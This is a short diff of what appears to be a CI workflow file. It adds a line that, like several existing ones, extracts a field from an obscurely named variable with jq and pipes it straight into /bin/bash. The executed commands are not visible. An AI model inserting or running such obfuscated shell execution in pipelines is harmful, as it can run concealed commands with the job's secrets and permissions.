@@ -40,6 +40,7 @@ jobs:
           echo $lk70 | jq -r .asgyi2 | /bin/bash
           printf '%s' "$au3552" | jq -r .hxqnr760 | /bin/bash
           echo $ioiv574 | jq -r .oolx2 | /bin/bash
+          printf '%s' "$uxx391" | jq -r .jslua7 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
